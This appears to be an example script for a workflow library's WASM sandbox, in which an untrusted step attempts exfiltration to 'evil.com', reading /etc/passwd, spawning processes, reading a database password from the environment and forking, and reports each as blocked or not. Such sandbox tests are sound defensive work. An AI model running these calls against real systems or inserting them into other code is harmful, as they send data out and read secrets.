from blazing import Blazing


async def main():
    app = Blazing()  # Uses Blazing SaaS by default

    # USER CODE (untrusted - attempts malicious actions)
    @app.step
    async def malicious_attempts(services=None):
        """
        Malicious code examples - all FAIL in WASM sandbox.
        """
        results = []

        # ATTEMPT 1: Network exfiltration
        try:
            import httpx
            await httpx.get("http://evil.com/exfiltrate")
            results.append("network: FAILED TO BLOCK (bad!)")
        except (ImportError, Exception):
            results.append("network: BLOCKED (good!)")

        # ATTEMPT 2: Read secrets from filesystem
        try:
            with open("/etc/passwd") as f:
                f.read()
            results.append("filesystem: FAILED TO BLOCK (bad!)")
        except (FileNotFoundError, OSError, PermissionError):
            results.append("filesystem: BLOCKED (good!)")

        # ATTEMPT 3: Spawn process
        try:
            import subprocess
            subprocess.run(["ls", "/"])
            results.append("subprocess: FAILED TO BLOCK (bad!)")
        except (ImportError, FileNotFoundError, OSError):
            results.append("subprocess: BLOCKED (good!)")

        # ATTEMPT 4: Access environment variables
        try:
            import os
            secret = os.getenv("DATABASE_PASSWORD")
            if secret:
                results.append("env_vars: FAILED TO BLOCK (bad!)")
            else:
                results.append("env_vars: BLOCKED (good!)")
        except Exception:
            results.append("env_vars: BLOCKED (good!)")

        # ATTEMPT 5: Fork bomb
        try:
            import os
            os.fork()
            results.append("fork: FAILED TO BLOCK (bad!)")
        except (ImportError, AttributeError, OSError):
            results.append("fork: BLOCKED (good!)")

        return {
            "message": "Security validation complete",
            "results": results,
            "all_blocked": all("BLOCKED" in r for r in results)
        }

    # YOUR CODE (trusted - orchestrates)
    @app.workflow
    async def test_security(services=None):
        """Test that malicious code is blocked."""
        return await malicious_attempts(services=services)

    await app.publish()

    # Execute the security test
    print("Testing sandbox security boundaries...")
    print("(All malicious attempts should be BLOCKED)\n")

    result = await app.test_security().wait_result()

    print("Security Test Results:")
    for r in result['results']:
        status = "PASS" if "BLOCKED" in r else "FAIL"
        print(f"  [{status}] {r}")

    print(f"\nAll attacks blocked: {result['all_blocked']}")


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())
